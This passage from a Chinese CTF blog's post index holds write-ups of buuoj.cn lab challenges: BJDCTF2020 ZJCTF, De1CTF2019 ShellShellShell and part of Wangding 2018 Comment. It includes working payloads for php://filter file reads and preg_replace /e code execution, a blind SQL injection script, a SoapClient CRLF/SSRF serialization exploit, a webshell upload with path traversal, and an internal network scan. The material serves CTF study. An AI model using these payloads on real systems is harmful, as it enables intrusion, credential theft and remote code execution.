src=\"https://img-blog.csdnimg.cn/20200705121058956.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>解码即得flag<br><img src=\"https://img-blog.csdnimg.cn/20200705121127588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n","categories":["buu刷题"],"tags":["phar","代码审计"]},{"title":"BJDCTF2020——ZJCTF，不过如此","url":"/2020/06/04/buu12%E2%80%94%E2%80%94%5BBJDCTF2020%5DZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/","content":"<p>平台：buuoj.cn<br>打开靶机得源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">$text = $_GET[<span class=\"string\">\"text\"</span>];</span><br><span class=\"line\">$file = $_GET[<span class=\"string\">\"file\"</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class=\"string\">'r'</span>)===<span class=\"string\">\"I have a dream\"</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br&gt;&lt;h1&gt;\"</span>.file_get_contents($text,<span class=\"string\">'r'</span>).<span class=\"string\">\"&lt;/h1&gt;&lt;/br&gt;\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/flag/\"</span>,$file))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">\"Not now!\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">include</span>($file);  <span class=\"comment\">//next.php</span></span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>这里和ZJCTF2019一道题一样，直接data协议+php://fliter读next.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,I have a dream&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;next.php</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://img-blog.csdnimg.cn/20200604090758737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>解码得</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$id = $_GET[<span class=\"string\">'id'</span>];</span><br><span class=\"line\">$_SESSION[<span class=\"string\">'id'</span>] = $id;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">complex</span><span class=\"params\">($re, $str)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> preg_replace(</span><br><span class=\"line\">        <span class=\"string\">'/('</span> . $re . <span class=\"string\">')/ei'</span>,</span><br><span class=\"line\">        <span class=\"string\">'strtolower(\"\\\\1\")'</span>,</span><br><span class=\"line\">        $str</span><br><span class=\"line\">    );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">foreach</span>($_GET <span class=\"keyword\">as</span> $re =&gt; $str) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> complex($re, $str). <span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getFlag</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t@<span class=\"keyword\">eval</span>($_GET[<span class=\"string\">'cmd'</span>]);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p> preg_replace 使用了 /e 模式，导致可以代码执行，可以参考<a href=\"https://xz.aliyun.com/t/2557\" target=\"_blank\" rel=\"noopener\">深入研究preg_replace与代码执行</a><br> 直接拿payload<br> <code>?\\S*=(要执行的代码)</code><br> next.php最后定义了一个代码执行函数getFlag()<br> 那么动态函数执行拼接一下<br> <code>?\\S*=${getFlag()}&amp;cmd=system(&#39;ls /&#39;);</code><br> <img src=\"https://img-blog.csdnimg.cn/2020060412013919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 得到flag<br> <img src=\"https://img-blog.csdnimg.cn/20200604120200149.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n","categories":["buu刷题"],"tags":["代码审计"]},{"title":"De1CTF2019——ShellShellShell","url":"/2020/07/17/%5BDe1CTF%202019%5DShellShellShell/","content":"<p>平台：buuoj.cn<br>打开靶机是一个登录框<br><img src=\"https://img-blog.csdnimg.cn/20200716163552947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>扫描器发现一些文件<br><img src=\"https://img-blog.csdnimg.cn/20200716173658153.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>后缀有个<code>~</code>还是第一次见，了解到是编辑器留下的备份文件，访问确实有源码<br>把几个文件都复制下来看看，seay审计软件爆了几个危险部分<br><img src=\"https://img-blog.csdnimg.cn/20200716190304331.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>看下位置代码<br><img src=\"https://img-blog.csdnimg.cn/20200716190929706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>将传入的参数传到数据库执行。注意到还有一个get_column函数<br><img src=\"https://img-blog.csdnimg.cn/20200716220553608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>传入的反引号会被替换成单引号。为sql注入创造了条件<br>看下哪个方法用到了insert函数<br>找到：<br><img src=\"https://img-blog.csdnimg.cn/2020071621441436.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>可以看到我们可以post一个signature去insert，并且这里对于这个参数是没有任何过滤的，所以很容易造成Sql注入<br>想要publish，就必须登录。<br><img src=\"https://img-blog.csdnimg.cn/20200716220808233.png\" alt=\"在这里插入图片描述\"><br>因此我们<code>?action=register</code>来注册一个账号并登录<br>然后注册和登录就必须通过code验证<br>可以看到是一个简单的md5碰撞，脚本爆破即可</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">import hashlib</span><br><span class=\"line\"></span><br><span class=\"line\">def func(md5_val):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> x in range(<span class=\"number\">999999</span>, <span class=\"number\">100000000</span>):</span><br><span class=\"line\">        md5_value=hashlib.md5(str(x).encode(encoding=<span class=\"string\">'utf-8'</span>)).hexdigest()</span><br><span class=\"line\">        <span class=\"keyword\">if</span> md5_value[:<span class=\"number\">5</span>]==md5_val:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> str(x)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    <span class=\"keyword\">print</span>(func(<span class=\"string\">'ac7a2'</span>))</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://img-blog.csdnimg.cn/20200716221056709.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20200716221325866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>登录成功我们来抓publish的包验证sql注入<br><img src=\"https://img-blog.csdnimg.cn/20200716221639298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>根据代码语句构造payload：<br><img src=\"https://img-blog.csdnimg.cn/20200716221742595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>那么确认了sql注入的存在，由于回显都是ok，考虑时间盲注<br>编写脚本：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\"></span><br><span class=\"line\">url=<span class=\"string\">\"http://f19eea67-1117-416a-9834-1d58c44d1f53.node3.buuoj.cn/index.php?action=publish\"</span></span><br><span class=\"line\">cookie = &#123;<span class=\"string\">\"PHPSESSID\"</span>:<span class=\"string\">\"05gn4tlsacq7pfundd7f89f983\"</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">k=<span class=\"string\">\"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"</span></span><br><span class=\"line\">flag=<span class=\"string\">\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i in range(<span class=\"number\">50</span>): </span><br><span class=\"line\">    <span class=\"keyword\">for</span> j in k:</span><br><span class=\"line\">        j = ord(j)</span><br><span class=\"line\">        data=&#123;</span><br><span class=\"line\">            <span class=\"string\">'mood'</span>:<span class=\"string\">'0'</span>,</span><br><span class=\"line\">            <span class=\"string\">'signature'</span>:<span class=\"string\">'1`,if(ascii(substr((select password from ctf_users where username=`admin`),&#123;&#125;,1))=&#123;&#125;,sleep(3),0))#'</span>.format(i,j)</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            r=requests.post(url,data=data,cookies=cookie,timeout=(<span class=\"number\">2</span>,<span class=\"number\">2</span>))</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            flag+=chr(j)</span><br><span class=\"line\">            <span class=\"keyword\">print</span>(flag)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n<p>至于这里为什么是知道跑admin和ctf_users表，嗯。。。。。看代码得到的<br><img src=\"https://img-blog.csdnimg.cn/20200716224909501.png\" alt=\"在这里插入图片描述\"><br>跑出密码的md5：<code>c991707fdf339958eded91331fb11ba0</code><br>网站解密得<code>jaivypassword</code><br>知道了admin和password，我们来试着登录<br>却登录失败<br><img src=\"https://img-blog.csdnimg.cn/20200716225347570.png\" alt=\"在这里插入图片描述\"><br>原来设置了ip限制<br><img src=\"https://img-blog.csdnimg.cn/202007162254256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>跟进get_ip函数<br><img src=\"https://img-blog.csdnimg.cn/20200716225458365.png\" alt=\"在这里插入图片描述\"><br>看来只有真实管理员地址才能登录<br>这里就出现了另一个考点：<strong>soapclient反序列化配合ssrf</strong><br>通过<code>?action=phpinfo</code>看到php开启了soap拓展<br><img src=\"https://img-blog.csdnimg.cn/20200716233422392.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>PHP 中，soap扩展可以用来提供和使用 Web Services，关于Web Services，<a href=\"https://baike.baidu.com/item/Web%20Service/1215039?fr=aladdin\" target=\"_blank\" rel=\"noopener\">百度百科</a><br>soapclient类则是用来创建soap数据报文，与wsdl接口进行交互，它有几个内置魔术方法<br><img src=\"https://img-blog.csdnimg.cn/2020071623374458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>回到代码，showmess函数中有一个反序列化点<br><img src=\"https://img-blog.csdnimg.cn/20200716231933426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"\"><br>反序列化<code>$row[2]</code>的值也就是<code>$mood</code>是我们可控的，假如我们把反序列化语句插入到注入语句中，比如</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">a`,&#123;serialize);<span class=\"comment\">#</span></span><br></pre></td></tr></table></figure>\n<p>它传入库中，我们访问<code>index.php?action=index</code>的时候就会触发<br>来实际操作一下<br>首先一个页面保持自己的非admin账号登录状态，另开一个页面不登录，这里为了防止cookie干扰就直接另开一个浏览器<br><img src=\"https://img-blog.csdnimg.cn/20200717093435307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20200717093451148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>接着开始构造soap，原理参考<a href=\"https://xz.aliyun.com/t/2148#toc-0\" target=\"_blank\" rel=\"noopener\">这位师傅</a></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$target = <span class=\"string\">'http://127.0.0.1/index.php?action=login'</span>;</span><br><span class=\"line\">$post_string = <span class=\"string\">'username=admin&amp;password=jaivypassword&amp;code=1174162'</span>;</span><br><span class=\"line\">$headers = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">    <span class=\"string\">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class=\"line\">    <span class=\"string\">'Cookie: PHPSESSID=c10j7vc0fu9v8gf52qt9st4pr0'</span></span><br><span class=\"line\">    );</span><br><span class=\"line\">$b = <span class=\"keyword\">new</span> SoapClient(<span class=\"keyword\">null</span>,<span class=\"keyword\">array</span>(<span class=\"string\">'location'</span> =&gt; $target,<span class=\"string\">'user_agent'</span>=&gt;<span class=\"string\">'wupco^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class=\"string\">'^^'</span>,$headers).<span class=\"string\">'^^Content-Length: '</span>.(string)strlen($post_string).<span class=\"string\">'^^^^'</span>.$post_string,<span class=\"string\">'uri'</span>      =&gt; <span class=\"string\">\"aaab\"</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">$aaa = serialize($b);</span><br><span class=\"line\">$aaa = str_replace(<span class=\"string\">'^^'</span>,<span class=\"string\">\"\\r\\n\"</span>,$aaa);</span><br><span class=\"line\">$aaa = str_replace(<span class=\"string\">'&amp;'</span>,<span class=\"string\">'&amp;'</span>,$aaa);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> bin2hex($aaa);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>这里注意code和PHPSESSID要和未登录页面保持一致<br>把生成的poc在publish插进去<br><img src=\"https://img-blog.csdnimg.cn/20200717100124148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>刷新一下?action=index使得库中的数据触发<br>这时<code>$mood</code>就是一个soap类，反序列化之后它访问不存在的方法就会触发内置<code>__call()</code>魔术方法<br><img src=\"https://img-blog.csdnimg.cn/20200717102938344.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20200717104345257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>也就是给该session登录的用户管理员身份<br>用另一个页面登录管理员账号看看<br>成功登录<br><img src=\"https://img-blog.csdnimg.cn/20200717100023992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>点开publish是一个上传<br><img src=\"https://img-blog.csdnimg.cn/20200717104607913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>让我们传图片但啥也没过滤，直接一句话传成功<br><img src=\"https://img-blog.csdnimg.cn/20200717105336123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>蚁剑连上<br><img src=\"https://img-blog.csdnimg.cn/20200717105607205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>之前说了flag在内网，查看下内网信息<br><img src=\"https://img-blog.csdnimg.cn/20200717110225698.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>扫下其他内网主机的端口<br>发现11主机开了80端口<br><img src=\"https://img-blog.csdnimg.cn/20200717110503559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>访问下有内容<br><img src=\"https://img-blog.csdnimg.cn/20200717110711187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>保存下来<br><img src=\"https://img-blog.csdnimg.cn/20200717110822143.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>得到源码<br><img src=\"https://img-blog.csdnimg.cn/20200717110812894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>有两层需要绕过<br><img src=\"https://img-blog.csdnimg.cn/20200717113228784.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20200717113246813.png\" alt=\"在这里插入图片描述\"><br>第一层数组来绕过，第二层随机文件名用路径穿越绕过。<br>构造<code>file[1]=aaa&amp;file[0]=php/../blacknight.php</code><br>postman构造传入<br><img src=\"https://img-blog.csdnimg.cn/20200717122058563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>点击右上方的code选择php-cURL生成代码<br><img src=\"https://img-blog.csdnimg.cn/20200717122124852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>但没有我们上传的内容所以要自己构造，这里参考<a href=\"https://www.zhaoj.in/read-6170.html\" target=\"_blank\" rel=\"noopener\">赵总</a><br>最终exp：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">$curl = curl_init();</span><br><span class=\"line\"></span><br><span class=\"line\">curl_setopt_array($curl, <span class=\"keyword\">array</span>(</span><br><span class=\"line\">  CURLOPT_URL =&gt; <span class=\"string\">\"http://173.24.214.11\"</span>,</span><br><span class=\"line\">  CURLOPT_RETURNTRANSFER =&gt; <span class=\"keyword\">true</span>,</span><br><span class=\"line\">  CURLOPT_ENCODING =&gt; <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">  CURLOPT_MAXREDIRS =&gt; <span class=\"number\">10</span>,</span><br><span class=\"line\">  CURLOPT_TIMEOUT =&gt; <span class=\"number\">30</span>,</span><br><span class=\"line\">  CURLOPT_HTTP_VERSION =&gt; CURL_HTTP_VERSION_1_1,</span><br><span class=\"line\">  CURLOPT_CUSTOMREQUEST =&gt; <span class=\"string\">\"POST\"</span>,</span><br><span class=\"line\">  CURLOPT_POSTFIELDS =&gt; <span class=\"string\">\"------WebKitFormBoundary7MA4YWxkTrZu0gW\\r\\nContent-Disposition: form-data; name=\\\"file\\\"; filename=\\\"blacknight.php\\\"\\r\\nContent-Type: false\\r\\n\\r\\n@&lt;?php echo `find /etc -name *flag* -exec cat &#123;&#125; +`;\\r\\n\\r\\n------WebKitFormBoundary7MA4YWxkTrZu0gW\\r\\nContent-Disposition: form-data; name=\\\"hello\\\"\\r\\n\\r\\nblacknight.php\\r\\n------WebKitFormBoundary7MA4YWxkTrZu0gW\\r\\nContent-Disposition: form-data; name=\\\"file[2]\\\"\\r\\n\\r\\n222\\r\\n------WebKitFormBoundary7MA4YWxkTrZu0gW\\r\\nContent-Disposition: form-data; name=\\\"file[1]\\\"\\r\\n\\r\\n111\\r\\n------WebKitFormBoundary7MA4YWxkTrZu0gW\\r\\nContent-Disposition: form-data; name=\\\"file[0]\\\"\\r\\n\\r\\n/../blacknight.php\\r\\n------WebKitFormBoundary7MA4YWxkTrZu0gW\\r\\nContent-Disposition: form-data; name=\\\"submit\\\"\\r\\n\\r\\nSubmit\\r\\n------WebKitFormBoundary7MA4YWxkTrZu0gW--\"</span>,</span><br><span class=\"line\">  CURLOPT_HTTPHEADER =&gt; <span class=\"keyword\">array</span>(</span><br><span class=\"line\">    <span class=\"string\">\"Postman-Token: a23f25ff-a221-47ef-9cfc-3ef4bd560c22\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"cache-control: no-cache\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"content-type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW\"</span></span><br><span class=\"line\">  ),</span><br><span class=\"line\">));</span><br><span class=\"line\"></span><br><span class=\"line\">$response = curl_exec($curl);</span><br><span class=\"line\">$err = curl_error($curl);</span><br><span class=\"line\"></span><br><span class=\"line\">curl_close($curl);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> ($err) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">\"cURL Error #:\"</span> . $err;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">echo</span> $response;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>把flag查询语句放到中间<br>全部复制下来放到php文件中上传<br><img src=\"https://img-blog.csdnimg.cn/20200717123207930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>访问即得flag<br><img src=\"https://img-blog.csdnimg.cn/2020071712322539.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>信息量太大，做的我脑瓜子嗡嗡的</p>\n","categories":["buu刷题"],"tags":["代码审计","soap_serialize_ssrf"]},{"title":"网鼎杯2018——Comment","url":"/2020/06/06/buu14%E2%80%94%E2%80%94%5Bwangdingbei%202018%5DComment/","content":"<p>平台：buuoj.cn<br>打开靶机是个留言板<br>发帖需要登录，只缺密码的后三位，burp爆破即可<br>扫下目录<br><img src=\"https://img-blog.csdnimg.cn/2020060610450529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>git泄露，githacker源码下下来<br>write_do.php<br>显示不全<br><img src=\"https://img-blog.csdnimg.cn/20200606113833309.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>历史文件恢复一下<br><img src=\"https://img-blog.csdnimg.cn/20200606113954115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20200606114109122.png\" alt=\"在这里插入图片描述\"><br>完整代码如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">\"mysql.php\"</span>;</span><br><span class=\"line\">session_start();</span><br><span class=\"line\"><span class=\"keyword\">if</span>($_SESSION[<span class=\"string\">'login'</span>] != <span class=\"string\">'yes'</span>)&#123;</span><br><span class=\"line\">    header(<span class=\"string\">\"Location: ./login.php\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">die</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'do'</span>]))&#123;</span><br><span class=\"line\"><span class=\"keyword\">switch</span> ($_GET[<span class=\"string\">'do'</span>])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"string\">'write'</span>:</span><br><span class=\"line\">    $category = addslashes($_POST[<span class=\"string\">'category'</span>]);</span><br><span class=\"line\">    $title = 